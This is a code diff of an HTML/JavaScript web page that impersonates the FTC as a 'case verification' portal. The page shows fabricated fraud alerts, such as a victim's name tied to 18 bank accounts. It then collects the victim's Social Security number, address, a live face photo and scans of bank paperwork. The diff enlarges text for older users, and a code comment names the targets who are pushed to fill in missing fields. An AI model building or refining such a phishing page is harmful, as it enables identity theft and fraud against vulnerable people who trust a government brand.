@@ -3,68 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FTC Consumer Sentinel Network | Case Verification Hub</title>
+    <title>Official FTC Case Verification & Help Portal</title>
+    
     <link rel="icon" type="image/png" href="https://lh3.googleusercontent.com/d/193iGXSOf2vVOFHWVY_Z_MUbdOIkKpBG7">
+
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
+    
     <style>
         .tab-content { display: none; }
         .tab-content.active { display: block; }
         .bg-ftc-navy { background-color: #0b2240; }
         .bg-ftc-blue { background-color: #065CB4; }
-        .bg-ftc-light { background-color: #E6F1FD; }
+        /* Increased global text sizing specifically for older users */
+        body { font-size: 18px; }
     </style>
 </head>
-<body class="bg-[#f0f4f8] text-gray-900 font-sans min-h-screen flex flex-col">
+<body class="bg-[#f4f7fa] text-gray-900 font-sans min-h-screen flex flex-col">
 
-    <div class="bg-gray-100 border-b border-gray-300 px-6 py-1.5 text-[11px] text-gray-600 flex items-center justify-between shadow-xs">
+    <div class="bg-gray-200 border-b border-gray-300 px-6 py-2 text-sm text-gray-700 flex items-center justify-between font-bold">
         <div class="flex items-center gap-2">
-            <span class="font-bold flex items-center gap-1"><span class="w-3 h-2 bg-blue-800 inline-block"></span>An official website of the United States government</span>
-            <span class="text-gray-300">|</span><span>Secure Bureau Environment</span>
+            <span class="w-4 h-2.5 bg-blue-800 inline-block rounded-xs"></span>
+            An official website of the United States Government. Secure Connection.
         </div>
-        <div class="font-mono text-gray-500 font-semibold tracking-wider uppercase text-[10px]">CUI // SP-BCP</div>
+        <div class="font-mono text-xs tracking-wider uppercase bg-gray-300 px-2 py-0.5 rounded">CUI // SP-BCP</div>
     </div>
 
-    <header class="bg-ftc-navy text-white px-8 py-5 flex justify-between items-center border-b-4 border-[#0071bc] shadow-md">
-        <div class="flex items-center space-x-5">
-            <div class="bg-white p-1 rounded-sm shadow-md flex items-center justify-center w-16 h-16 overflow-hidden border border-gray-300">
-                <img src="https://lh3.googleusercontent.com/d/193iGXSOf2vVOFHWVY_Z_MUbdOIkKpBG7" alt="FTC Official Seal" class="w-full h-full object-contain">
+    <header class="bg-ftc-navy text-white px-8 py-6 flex justify-between items-center border-b-8 border-[#0071bc] shadow-md">
+        <div class="flex items-center space-x-6">
+            <div class="bg-white p-1.5 rounded shadow-md flex items-center justify-center w-20 h-20 overflow-hidden border-2 border-gray-300 shrink-0">
+                <img src="https://lh3.googleusercontent.com/d/193iGXSOf2vVOFHWVY_Z_MUbdOIkKpBG7" alt="FTC Seal" class="w-full h-full object-contain">
             </div>
             <div>
-                <h1 class="text-2xl font-serif font-extrabold tracking-tight text-white uppercase">Federal Trade Commission</h1>
-                <p class="text-xs text-blue-300 font-mono tracking-widest uppercase">Bureau of Consumer Protection • Identity Theft Sentinel Matrix</p>
+                <h1 class="text-3xl font-serif font-black tracking-tight text-white uppercase">Federal Trade Commission</h1>
+                <p class="text-sm text-blue-200 font-mono tracking-widest uppercase font-bold">Bureau of Consumer Protection • Consumer Identity Portal</p>
             </div>
         </div>
-        <button onclick="resetMockData()" class="text-xs bg-red-950/40 hover:bg-red-900/40 text-red-300 px-3 py-1.5 rounded font-mono border border-red-900 transition">Purge Cache</button>
+        <button onclick="resetMockData()" class="text-xs bg-red-900/60 hover:bg-red-850 font-mono border border-red-700 text-white px-4 py-2 rounded font-bold uppercase transition">Reset App Data</button>
     </header>
 
     <div class="flex flex-1 overflow-hidden">
-        <nav class="w-64 bg-white p-4 space-y-1 flex flex-col justify-between border-r border-gray-200 shadow-sm">
-            <div class="space-y-2">
-                <p class="px-3 text-[10px] font-extrabold text-gray-400 uppercase tracking-widest mb-2 border-b border-gray-100 pb-1">Public Interfacing</p>
-                <button onclick="switchTab('victim-portal-tab')" id="btn-victim-portal-tab" class="tab-btn w-full flex items-center space-x-3 px-3 py-2.5 rounded text-sm font-semibold text-gray-700 hover:bg-slate-100 transition">
-                    <i data-lucide="shield-check" class="w-4 h-4 text-[#0071bc]"></i> <span>Secure Identity Gateway</span>
+        <nav class="w-72 bg-white p-6 space-y-2 flex flex-col justify-between border-r border-gray-300 shadow-sm">
+            <div class="space-y-4">
+                <p class="px-3 text-xs font-black text-gray-400 uppercase tracking-widest border-b border-gray-200 pb-2">Main Menu</p>
+                <button onclick="switchTab('victim-portal-tab')" id="btn-victim-portal-tab" class="tab-btn w-full flex items-center space-x-3 px-4 py-4 rounded-xl text-lg font-bold text-gray-700 hover:bg-slate-100 transition border-2 border-transparent">
+                    <i data-lucide="shield-check" class="w-6 h-6 text-[#0071bc]"></i> <span>My Identity Portal</span>
                 </button>
-                <p class="px-3 text-[10px] font-extrabold text-gray-400 uppercase tracking-widest mt-6 mb-2 border-b border-gray-100 pb-1">Bureau Operations</p>
-                <button onclick="switchTab('officer-dashboard-tab')" id="btn-officer-dashboard-tab" class="tab-btn w-full flex items-center space-x-3 px-3 py-2.5 rounded text-sm font-semibold text-gray-700 hover:bg-slate-100 transition">
-                    <i data-lucide="folder-git-2" class="w-4 h-4 text-ftc-navy"></i> <span>Enforcement Control</span>
+                <button onclick="switchTab('officer-dashboard-tab')" id="btn-officer-dashboard-tab" class="tab-btn w-full flex items-center space-x-3 px-4 py-4 rounded-xl text-lg font-bold text-gray-700 hover:bg-slate-100 transition border-2 border-transparent">
+                    <i data-lucide="folder-git-2" class="w-6 h-6 text-ftc-navy"></i> <span>Officer Workspace</span>
                 </button>
             </div>
         </nav>
 
         <main class="flex-1 p-8 overflow-y-auto">
+
             <section id="victim-portal-tab" class="tab-content">
-                <div class="max-w-4xl mx-auto space-y-6">
-                    <div class="bg-white border border-gray-300 rounded shadow-md p-6">
-                        <h2 class="text-xl font-serif font-bold text-ftc-navy flex items-center gap-2 mb-2">ReportFraud.ftc.gov Secure Verification Node</h2>
-                        <div class="flex gap-2">
-                            <input type="text" id="victimSearchInput" placeholder="Enter Reference Code (Try: 123 or dc-97224)" class="flex-1 bg-white border border-gray-300 rounded px-4 py-2 text-gray-900 font-mono focus:outline-none focus:border-[#0071bc] text-sm shadow-inner">
-                            <button onclick="trackVictimCase()" class="bg-[#0071bc] hover:bg-blue-800 text-white font-bold px-6 py-2 rounded text-sm flex items-center gap-2 transition shadow-md"><i data-lucide="database-zap" class="w-4 h-4"></i> Execute File Query</button>
+                <div class="max-w-4xl mx-auto space-y-8">
+                    
+                    <div class="bg-white border-2 border-gray-300 rounded-2xl shadow-lg p-8">
+                        <h2 class="text-2xl font-serif font-black text-ftc-navy flex items-center gap-2 mb-2">
+                            Log In to Your Case File
+                        </h2>
+                        <p class="text-sm text-gray-600 mb-6 font-medium">Please type your assigned Case ID number below to safely view your files, check updates, or scan paperwork.</p>
+                        
+                        <div class="flex flex-col sm:flex-row gap-4">
+                            <input type="text" id="victimSearchInput" placeholder="Type Case ID Here (Example: 123 or dc-97224)" class="flex-1 bg-white border-2 border-gray-400 rounded-xl px-5 py-4 text-gray-900 font-bold uppercase tracking-wider focus:outline-none focus:border-[#0071bc] text-lg shadow-inner">
+                            <button onclick="trackVictimCase()" class="bg-[#0071bc] hover:bg-blue-800 text-white font-black px-8 py-4 rounded-xl text-lg flex items-center justify-center gap-2 transition shadow-md whitespace-nowrap">
+                                <i data-lucide="key-round" class="w-5 h-5"></i> View My Case
+                            </button>
                         </div>
                     </div>
-                    <div id="victimPortalOutput" class="bg-white border border-gray-300 rounded border-dashed p-12 text-center text-gray-400">
-                        <i data-lucide="binary" class="w-16 h-16 mx-auto mb-3 opacity-20 text-ftc-navy animate-pulse"></i>
-                        <p class="text-sm font-semibold text-gray-500">Awaiting Secure Clearance Reference Verification</p>
+
+                    <div id="victimPortalOutput" class="bg-white border-2 border-dashed border-gray-300 rounded-2xl p-12 text-center text-gray-400">
+                        <i data-lucide="folder-search" class="w-20 h-20 mx-auto mb-4 opacity-20 text-ftc-navy"></i>
+                        <p class="text-xl font-bold text-gray-500">Awaiting Your Case ID</p>
+                        <p class="text-sm text-gray-400 mt-2 font-medium">Type your number in the white box above and click the blue "View My Case" button.</p>
                     </div>
                 </div>
             </section>
@@ -73,35 +86,32 @@
                 <div class="grid grid-cols-3 gap-6">
                     <div class="col-span-1 bg-white border border-gray-300 rounded shadow-sm p-4 flex flex-col justify-between">
                         <div>
-                            <h3 class="text-[11px] font-extrabold uppercase text-gray-400 tracking-wider mb-3 flex items-center gap-2"><i data-lucide="fingerprint" class="text-[#0071bc] w-4 h-4"></i> Sentinel Matrix Registry</h3>
+                            <h3 class="text-xs font-bold uppercase text-gray-400 tracking-wider mb-3"><i data-lucide="fingerprint" class="inline w-4 h-4 mr-1"></i> Registry</h3>
                             <div id="officerCaseList" class="space-y-2"></div>
                         </div>
                     </div>
                     <div class="col-span-2 space-y-6">
                         <div class="bg-white border border-gray-300 rounded shadow-sm p-6">
-                            <div class="flex justify-between items-center border-b border-gray-200 pb-3 mb-4">
-                                <h3 class="text-sm font-bold uppercase text-ftc-navy flex items-center gap-2">Enforcement Parameter Controls</h3>
-                                <span id="activeEditingCaseBadge" class="text-xs font-mono font-bold bg-slate-100 px-2 py-1 border border-gray-300 rounded text-[#0071bc]"></span>
-                            </div>
-                            <div class="grid grid-cols-2 gap-4">
+                            <h3 class="text-sm font-bold uppercase text-ftc-navy border-b border-gray-200 pb-2 mb-4">Investigator Override Panel</h3>
+                            <div class="grid grid-cols-2 gap-4 text-sm">
                                 <div>
-                                    <label class="block text-xs font-bold text-gray-600 uppercase mb-1">Assigned Investigator</label>
-                                    <input type="text" id="inputOfficerName" class="w-full bg-white border border-gray-300 rounded p-2 text-sm text-gray-900 focus:outline-none">
+                                    <label class="block font-bold text-gray-600 uppercase mb-1">Agent Name</label>
+                                    <input type="text" id="inputOfficerName" class="w-full bg-white border border-gray-300 rounded p-2 text-gray-900">
                                 </div>
                                 <div>
-                                    <label class="block text-xs font-bold text-gray-600 uppercase mb-1">Inquiry Status Phase</label>
-                                    <select id="inputCaseStatus" class="w-full bg-white border border-gray-300 rounded p-2 text-sm text-gray-900 focus:outline-none">
+                                    <label class="block font-bold text-gray-600 uppercase mb-1">Status Phase</label>
+                                    <select id="inputCaseStatus" class="w-full bg-white border border-gray-300 rounded p-2 text-gray-900">
                                         <option value="Intake Assessment Phase">Intake Assessment Phase</option>
                                         <option value="Active Bureau Investigation">Active Bureau Investigation</option>
                                         <option value="Identity Corrupted / Proving Non-Repudiation">Identity Corrupted / Proving Non-Repudiation</option>
                                     </select>
                                 </div>
                                 <div class="col-span-2">
-                                    <label class="block text-xs font-bold text-gray-600 uppercase mb-1">Official Findings Summary</label>
-                                    <textarea id="inputFindings" rows="4" class="w-full bg-white border border-gray-300 rounded p-2 text-sm text-gray-900 focus:outline-none text-gray-800"></textarea>
+                                    <label class="block font-bold text-gray-600 uppercase mb-1">Official Progress Summary Notes</label>
+                                    <textarea id="inputFindings" rows="4" class="w-full bg-white border border-gray-300 rounded p-2 text-gray-900"></textarea>
                                 </div>
                             </div>
-                            <button onclick="saveOfficerUpdates()" class="mt-4 w-full bg-ftc-navy hover:bg-slate-800 text-white font-semibold py-2 rounded text-sm transition font-mono uppercase tracking-wider shadow">Commit Enforcement Modifications</button>
+                            <button onclick="saveOfficerUpdates()" class="mt-4 w-full bg-ftc-navy hover:bg-slate-800 text-white font-bold py-2 rounded transition uppercase tracking-wider font-mono">Commit Updates</button>
                         </div>
                     </div>
                 </div>
@@ -134,13 +144,13 @@
                 victimAddress: "Not Registered / Pending Formal Intake Update",
                 victimSsn: "",
                 biometricImg: "",
-                title: "Section 5 Inquiry: Identity Impersonation & Fraudulent Corporate Account Proliferation",
+                title: "Identity Impersonation & Fraudulent Corporate Account Proliferation",
                 target: "Syndicate Identity Routing Networks",
                 officer: "Special Investigator Marcus Vance",
                 status: "Identity Corrupted / Proving Non-Repudiation",
-                findings: "Deep forensic tracking has established that the victim's structural identifying details were compromised and weaponized to synthesize a network of accounts.",
+                findings: "Deep forensic tracking has established that the victim's structural identifying details were compromised and weaponized to synthesize a network of accounts. Financial intelligence sweeps have cross-referenced and flagged the victim's name as being fraudulently integrated across 18 separate banking institutions without direct knowledge or lawful authorization.",
                 evidence: [
-                    { date: "2026-05-11", desc: "Cross-agency banking trace mapping data illustrating 18 illicit entity lines assigned to victim parameters", isImage: false, fileUrl: "" }
+                    { date: "May 11, 2026", desc: "Cross-agency banking trace mapping data illustrating 18 illicit entity lines assigned to victim parameters", isImage: false, fileUrl: "" }
                 ]
             },
             {
@@ -151,13 +161,13 @@
                 victimAddress: "455 West 23rd Street, Apt 3B, New York, NY 10011",
                 victimSsn: "",
                 biometricImg: "", 
-                title: "Section 5 Inquiry: Malicious Identity Hijacking & Unauthorized Lines of Credit",
+                title: "Malicious Identity Hijacking & Unauthorized Lines of Credit",
                 target: "Acme Credit Brokerage Syndicates",
                 officer: "Unassigned / Bureau Allocation Routing Pending",
                 status: "Intake Assessment Phase",
-                findings: "Initial file compiled. High-priority systemic review scheduled.",
+                findings: "Initial file compiled. High-priority systemic review scheduled. Cross-referencing current consumer complaints with local financial lending operations to target malicious credit inquiries.",
                 evidence: [
-                    { date: "2026-05-26", desc: "Initial consumer dispute affidavit successfully indexed.", isImage: false, fileUrl: "" }
+                    { date: "May 26, 2026", desc: "Initial consumer dispute affidavit successfully indexed.", isImage: false, fileUrl: "" }
                 ]
             }
         ];
@@ -183,157 +193,184 @@
             const foundCase = cases.find(c => c.id.toLowerCase() === searchId.toLowerCase());
 
             if(!foundCase) {
-                container.innerHTML = `<div class="text-center text-red-700 p-6 bg-red-50 border border-red-200 rounded font-sans"><h4 class="font-bold">File Verification Fault</h4></div>`;
+                container.innerHTML = `<div class="text-center text-red-700 p-6 bg-red-50 border-2 border-red-200 rounded-xl font-sans"><h4 class="text-xl font-bold font-serif">Case ID Not Found</h4><p class="text-sm text-gray-600 mt-1">Double check the number you typed. We don't have record of Case: "${searchId}"</p></div>`;
                 return;
             }
 
             let evidenceHtml = ""; let previewGalleryHtml = "";
             foundCase.evidence.forEach(e => {
-                evidenceHtml += `<div class="flex items-start gap-3 bg-slate-50 p-2.5 rounded border border-gray-200 text-xs text-gray-700 font-sans"><span class="bg-slate-200 text-slate-800 font-mono px-2 py-0.5 rounded text-[10px] font-bold border border-gray-300 shadow-xs">${e.date}</span><p class="mt-0.5">${e.desc}</p></div>`;
+                evidenceHtml += `<div class="flex items-start gap-3 bg-slate-50 p-3 rounded-lg border border-gray-200 text-sm font-sans"><span class="bg-slate-200 text-slate-800 font-mono px-2 py-0.5 rounded text-xs font-bold border border-gray-300 shrink-0">${e.date}</span><p class="text-gray-800 font-medium">${e.desc}</p></div>`;
                 if (e.isImage && e.fileUrl) {
-                    previewGalleryHtml += `<div class="relative bg-white border border-gray-300 rounded p-1.5 shadow-xs flex flex-col items-center"><img src="${e.fileUrl}" class="w-full h-24 object-cover rounded-xs border border-gray-200"><span class="text-[9px] font-mono font-bold text-gray-500 mt-1 block truncate w-full text-center">${e.date} Scan</span></div>`;
+                    previewGalleryHtml += `<div class="bg-white border border-gray-300 rounded-xl p-2 shadow-xs flex flex-col items-center"><img src="${e.fileUrl}" class="w-full h-24 object-cover rounded-md border border-gray-200"><span class="text-xs font-bold text-gray-500 mt-2">${e.date}</span></div>`;
                 }
             });
 
-            if (previewGalleryHtml === "") previewGalleryHtml = `<p class="text-xs text-gray-400 italic col-span-full">No image document scans committed yet.</p>`;
+            if (previewGalleryHtml === "") previewGalleryHtml = `<p class="text-sm text-gray-400 italic col-span-full font-medium">No paperwork images scanned into this case file yet.</p>`;
 
             let redactedEmailStrings = foundCase.victimEmails ? foundCase.victimEmails.map(email => applyEmailPrivacyMask(email)).join(" | ") : applyEmailPrivacyMask(foundCase.victimEmail);
             let redactedPhoneString = applyPhonePrivacyMask(foundCase.victimPhone);
             let redactedSsnString = applySsnPrivacyMask(foundCase.victimSsn);
 
+            // EVALUATE COMPLETION: Profile is complete if Address is filled, SSN exists, and Biometric is saved
             const isProfileComplete = foundCase.victimAddress !== "Not Registered / Pending Formal Intake Update" && foundCase.victimSsn !== "" && foundCase.biometricImg !== "";
             let intakeSectionHtml = "";
             
             if (!isProfileComplete) {
+                // SETUP WORKFLOW: Locks fields to Read-Only, forces Douglas/Eric to only fill missing fields and capture Front camera
                 intakeSectionHtml = `
-                    <div class="bg-gray-50 p-5 rounded border border-gray-300 grid grid-cols-1 md:grid-cols-2 gap-6 shadow-inner animate-fadeIn">
-                        <div class="space-y-3">
-                            <h5 class="text-xs font-bold text-ftc-navy uppercase tracking-wider border-b border-gray-200 pb-1 flex items-center gap-1"><i data-lucide="text-cursor-input" class="w-3.5 h-3.5"></i> Demographic Identification Registry</h5>
-                            <div class="grid grid-cols-2 gap-3">
-                                <div class="col-span-2">
-                                    <label class="block text-[10px] font-bold text-gray-600 uppercase">Full Legal Name</label>
-                                    <input type="text" id="intakeName" value="${foundCase.victimName}" class="w-full bg-white border border-gray-300 rounded p-2 text-xs font-semibold focus:outline-none">
-                                </div>
-                                <div class="col-span-2">
-                                    <label class="block text-[10px] font-bold text-gray-600 uppercase">Physical Address</label>
-                                    <input type="text" id="intakeAddress" value="${foundCase.victimAddress !== 'Not Registered / Pending Formal Intake Update' ? foundCase.victimAddress : ''}" placeholder="Street Address, City, State, ZIP" class="w-full bg-white border border-gray-300 rounded p-2 text-xs focus:outline-none">
-                                </div>
-                                <div>
-                                    <label class="block text-[10px] font-bold text-gray-600 uppercase">Phone Line</label>
-                                    <input type="text" id="intakePhone" value="${foundCase.victimPhone}" class="w-full bg-white border border-gray-300 rounded p-2 text-xs font-mono focus:outline-none">
-                                </div>
-                                <div>
-                                    <label class="block text-[10px] font-bold text-gray-600 uppercase">SSN Registry Code</label>
-                                    <input type="password" id="intakeSsn" placeholder="000-00-0000" class="w-full bg-white border border-gray-300 rounded p-2 text-xs font-mono focus:outline-none">
-                                </div>
-                            </div>
+                    <div class="bg-amber-50/50 border-2 border-amber-300 p-6 rounded-2xl space-y-6 font-sans shadow-sm animate-fadeIn">
+                        <div class="border-b-2 border-amber-200 pb-3">
+                            <h4 class="text-xl font-black text-amber-900 flex items-center gap-1.5"><i data-lucide="user-plus"></i> Step 1: Complete Your Identity Verification</h4>
+                            <p class="text-sm text-amber-800 mt-1 font-semibold">Your personal verification data must be submitted once to lock this security portal down.</p>
                         </div>
-                        <div class="space-y-3 flex flex-col justify-center">
-                            <h5 class="text-xs font-bold text-ftc-navy uppercase tracking-wider border-b border-gray-200 pb-1 flex items-center gap-1"><i data-lucide="scan" class="w-3.5 h-3.5"></i> Biometric Identification Verification</h5>
-                            
-                            <div id="liveCamFrame" class="w-full h-36 bg-black rounded border border-gray-300 relative overflow-hidden flex items-center justify-center">
-                                <video id="webcamVideo" autoplay playsinline class="w-full h-full object-cover hidden"></video>
-                                <canvas id="capturedCanvas" class="w-full h-full object-cover hidden"></canvas>
-                                <div id="cameraPrompt" class="text-center p-4 text-gray-500">
-                                    <button onclick="initializeCameraHardware(false)" class="bg-slate-700 hover:bg-slate-600 text-white font-mono text-[10px] px-3 py-1.5 rounded transition shadow-sm">Initialize Live Streaming Lens</button>
+
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6 text-gray-800">
+                            <div class="space-y-3">
+                                <div><label class="block text-xs font-bold uppercase text-gray-500 mb-0.5">Your Full Legal Name (Locked)</label><div class="w-full bg-gray-200 border-2 border-gray-300 rounded-xl p-3 font-extrabold text-gray-600">${foundCase.victimName}</div></div>
+                                <div><label class="block text-xs font-bold uppercase text-gray-500 mb-0.5">Your Telephone Contact (Locked)</label><div class="w-full bg-gray-200 border-2 border-gray-300 rounded-xl p-3 font-mono font-bold text-gray-600">${foundCase.victimPhone}</div></div>
+                                
+                                <div>
+                                    <label class="block text-xs font-black text-gray-700 uppercase mb-0.5">Your Physical Mailing Address</label>
+                                    <input type="text" id="intakeAddress" value="${foundCase.victimAddress !== 'Not Registered / Pending Formal Intake Update' ? foundCase.victimAddress : ''}" placeholder="Street Address, City, State, ZIP" class="w-full bg-white border-2 border-gray-400 font-bold rounded-xl p-3 text-sm focus:outline-none focus:border-[#0071bc]">
                                 </div>
-                            </div>
-                            <div id="liveCamControls" class="flex gap-2">
-                                <button id="btnCapture" onclick="executeImageCapture()" disabled class="flex-1 bg-slate-800 text-white font-bold py-1.5 rounded text-xs transition disabled:opacity-40">Capture Face Snapshot</button>
-                                <button id="btnResetCam" onclick="resetCameraModule()" disabled class="bg-gray-300 text-gray-700 font-bold px-3 py-1.5 rounded text-xs transition disabled:opacity-40"><i data-lucide="refresh-cw" class="w-3.5 h-3.5"></i></button>
+                                <div>
+                                    <label class="block text-xs font-black text-gray-700 uppercase mb-0.5">Your Social Security Number (SSN)</label>
+                                    <input type="password" id="intakeSsn" placeholder="000-00-0000" class="w-full bg-white border-2 border-gray-400 font-bold rounded-xl p-3 text-sm font-mono focus:outline-none focus:border-[#0071bc]">
+                                </div>
                             </div>
 
-                            <div class="border-t border-gray-200 pt-3 mt-1">
-                                <label class="block text-[10px] font-bold text-red-600 uppercase mb-1">⚠️ Camera blocked? Upload Photo directly instead:</label>
-                                <input type="file" id="fallbackFileInput" accept="image/*" onchange="handleFallbackFileSelection()" class="w-full bg-white border border-gray-300 rounded p-1 text-xs text-gray-600">
+                            <div class="space-y-4 flex flex-col justify-between">
+                                <div class="space-y-2">
+                                    <label class="block text-xs font-black text-gray-700 uppercase">Your Biometric Identity Picture</label>
+                                    <div id="liveCamFrame" class="w-full h-44 bg-black rounded-xl border-2 border-gray-400 relative overflow-hidden flex items-center justify-center shadow-inner">
+                                        <video id="webcamVideo" autoplay playsinline class="w-full h-full object-cover hidden"></video>
+                                        <canvas id="capturedCanvas" class="w-full h-full object-cover hidden"></canvas>
+                                        <div id="cameraPrompt" class="text-center p-4">
+                                            <button onclick="initializeCameraHardware(false)" class="bg-slate-700 hover:bg-slate-600 text-white font-bold text-sm px-5 py-3 rounded-xl transition shadow-md flex items-center gap-1.5 mx-auto"><i data-lucide="video"></i> Turn On Face Camera</button>
+                                        </div>
+                                    </div>
+                                    <div id="liveCamControls" class="flex gap-2">
+                                        <button id="btnCapture" onclick="executeImageCapture()" disabled class="flex-1 bg-slate-800 hover:bg-black text-white font-black py-3 rounded-xl text-sm transition disabled:opacity-30">Take Snapshot Photo</button>
+                                        <button id="btnResetCam" onclick="resetCameraModule()" disabled class="bg-gray-300 text-gray-700 font-black px-4 py-3 rounded-xl text-sm transition disabled:opacity-30"><i data-lucide="refresh-cw" class="w-4 h-4"></i></button>
+                                    </div>
+                                    
+                                    <div class="border-t border-gray-300 pt-3 mt-1">
+                                        <label class="block text-[11px] font-black text-red-600 uppercase mb-1">Camera blocked? Click here to select a saved photo from your device:</label>
+                                        <input type="file" id="fallbackFileInput" accept="image/*" onchange="handleFallbackFileSelection()" class="w-full bg-white border border-gray-300 rounded p-1 text-xs text-gray-600">
+                                    </div>
+                                </div>
                             </div>
                         </div>
+
+                        <button onclick="submitIntakePipeline('${foundCase.id}', false)" class="w-full bg-red-700 hover:bg-red-800 text-white font-black py-4 rounded-xl shadow-md transition flex justify-center items-center gap-2 tracking-wider text-xl font-serif uppercase border-b-4 border-red-900">
+                            <i data-lucide="shield-alert" class="w-6 h-6"></i> Save Profile Data & Confirm Verification
+                        </button>
                     </div>
+                </div>
                 `;
             } else {
+                // COMPLETED DROP BOX STATE: Standard form elements are excluded entirely. Clean, large rear camera scanner buttons dominate viewport.
                 intakeSectionHtml = `
-                    <div class="bg-blue-50/50 border border-blue-200 p-5 rounded-xl grid grid-cols-1 md:grid-cols-2 gap-6 shadow-xs animate-fadeIn">
-                        <div class="space-y-2 flex flex-col justify-between">
+                    <div class="bg-blue-50 border-2 border-blue-300 p-8 rounded-2xl grid grid-cols-1 md:grid-cols-2 gap-8 shadow-sm font-sans animate-fadeIn">
+                        <div class="space-y-4 flex flex-col justify-between">
                             <div>
-                                <h5 class="text-sm font-serif font-bold text-ftc-navy flex items-center gap-1.5"><i data-lucide="scan-eye" class="text-ftc-blue w-4 h-4"></i> Documentary Evidence Scanner</h5>
-                                <p class="text-xs text-gray-600 mt-1">Deploy mobile lens or direct uploads to append snapshots of transaction records immediately.</p>
+                                <h4 class="text-2xl font-black text-ftc-navy flex items-center gap-1.5"><i data-lucide="camera" class="text-ftc-blue"></i> Evidence Submission Hub</h4>
+                                <p class="text-sm text-gray-700 mt-2 font-medium">Your profile verification requirements are completely active. Use the submission lens on the right to scan paperwork, bank records, or notices directly into your file repository anytime.</p>
                             </div>
-                            <div class="pt-2">
-                                <label class="block text-[10px] font-bold text-gray-600 uppercase mb-0.5">Evidence Label Description</label>
-                                <textarea id="uploadStatement" rows="2" placeholder="List details concerning the paperwork or accounts..." class="w-full bg-white border border-gray-300 rounded p-2 text-xs focus:outline-none"></textarea>
+                            <div>
+                                <label class="block text-xs font-black text-gray-700 uppercase mb-1">What bank or item does this paperwork show? (Short Note)</label>
+                                <input type="text" id="uploadStatement" placeholder="Example: Notice from Apex Crypto or Fake Bank letter" class="w-full bg-white border-2 border-gray-400 font-bold rounded-xl p-3 text-sm focus:outline-none focus:border-ftc-blue">
                             </div>
                         </div>
-                        <div class="space-y-2">
-                            <div id="liveCamFrame" class="w-full h-36 bg-black rounded border border-gray-300 relative overflow-hidden flex items-center justify-center">
+
+                        <div class="space-y-3">
+                            <label class="block text-xs font-black text-gray-700 uppercase">Document Scanning Lens Viewport</label>
+                            <div id="liveCamFrame" class="w-full h-44 bg-black rounded-xl border-2 border-gray-400 relative overflow-hidden flex items-center justify-center shadow-inner">
                                 <video id="webcamVideo" autoplay playsinline class="w-full h-full object-cover hidden"></video>
                                 <canvas id="capturedCanvas" class="w-full h-full object-cover hidden"></canvas>
-                                <div id="cameraPrompt" class="text-center p-4 text-gray-500">
-                                    <button onclick="initializeCameraHardware(true)" class="bg-[#0071bc] hover:bg-blue-800 text-white font-mono text-[11px] font-bold px-4 py-1.5 rounded transition mx-auto">Activate Rear Scanner</button>
+                                <div id="cameraPrompt" class="text-center p-4">
+                                    <button onclick="initializeCameraHardware(true)" class="bg-[#0071bc] hover:bg-blue-800 text-white font-black text-md px-6 py-3.5 rounded-xl transition flex items-center gap-2 mx-auto shadow-md"><i data-lucide="video" class="w-5 h-5"></i> 📸 OPEN DOCUMENT CAMERA</button>
                                 </div>
                             </div>
                             <div id="liveCamControls" class="flex gap-2">
-                                <button id="btnCapture" onclick="executeImageCapture()" disabled class="flex-1 bg-slate-800 text-white font-bold py-1.5 rounded text-xs transition disabled:opacity-40">Capture Paperwork Scan</button>
-                                <button id="btnResetCam" onclick="resetCameraModule()" disabled class="bg-gray-300 text-gray-700 font-bold px-3 py-1.5 rounded text-xs transition disabled:opacity-40"><i data-lucide="refresh-cw" class="w-3.5 h-3.5"></i></button>
+                                <button id="btnCapture" onclick="executeImageCapture()" disabled class="flex-1 bg-slate-800 hover:bg-black text-white font-black py-3 rounded-xl text-xs transition disabled:opacity-30">Snapshot Document Page</button>
+                                <button id="btnResetCam" onclick="resetCameraModule()" disabled class="bg-gray-300 text-gray-700 font-black px-4 py-3 rounded-xl text-xs transition disabled:opacity-40"><i data-lucide="refresh-cw" class="w-4 h-4"></i></button>
                             </div>
-                            <div class="border-t border-gray-200 pt-2 mt-1">
+                            <div class="border-t border-gray-300 pt-2 mt-1">
+                                <label class="block text-[11px] font-black text-red-600 uppercase mb-1">Camera blocked? Click here to select a saved image file:</label>
                                 <input type="file" id="fallbackFileInput" accept="image/*" onchange="handleFallbackFileSelection()" class="w-full bg-white border border-gray-300 rounded p-1 text-xs text-gray-600">
                             </div>
                         </div>
+
+                        <button onclick="submitIntakePipeline('${foundCase.id}', true)" class="col-span-full bg-ftc-blue hover:bg-blue-800 text-white font-black py-4 rounded-xl text-xl shadow-md transition uppercase font-serif tracking-wider flex items-center justify-center gap-2 border-b-4 border-blue-900">
+                            <i data-lucide="send-to-back" class="w-5 h-5"></i> Securely Append & Transmit Paperwork Package
+                        </button>
                     </div>
                 `;
             }
 
-            let conditionalFlagAlertHtml = foundCase.id === "123" ? `<div class="bg-amber-50 border border-amber-300 rounded p-4 flex items-start space-x-3 text-amber-900 font-sans shadow-xs"><i data-lucide="alert-octagon" class="w-5 h-5 text-amber-600 shrink-0 mt-0.5"></i><div><h5 class="text-xs font-bold uppercase tracking-wider font-mono text-amber-800">Critical Incident Flag: 18 Spurious Accounts Located</h5><p class="text-xs mt-1 font-medium text-amber-800">This identity infrastructure correlates directly to **18 active commercial bank accounts**.</p></div></div>` : "";
+            let conditionalFlagAlertHtml = foundCase.id === "123" ? `<div class="bg-amber-50 border-2 border-amber-300 rounded-xl p-4 flex items-start space-x-3 text-amber-900 font-sans shadow-xs"><i data-lucide="alert-octagon" class="w-5 h-5 text-amber-600 shrink-0 mt-0.5"></i><div><h5 class="text-xs font-bold uppercase tracking-wider font-mono text-amber-800">Critical Incident Flag: 18 Spurious Accounts Located</h5><p class="text-xs mt-1 font-medium text-amber-800">This identity infrastructure correlates directly to **18 active commercial bank accounts**.</p></div></div>` : "";
 
             container.innerHTML = `
-                <div class="w-full text-left bg-white border border-gray-300 rounded shadow-sm p-6 space-y-6 font-serif animate-fadeIn">
-                    <div class="flex justify-between items-start border-b border-gray-200 pb-4">
-                        <div>
+                <div class="w-full text-left bg-white border-2 border-gray-300 rounded-2xl shadow-md p-6 space-y-6 font-serif animate-fadeIn">
+                    
+                    <div class="flex justify-between items-start border-b-2 border-gray-200 pb-4">
+                        <div class="space-y-1">
                             <div class="flex items-center gap-2">
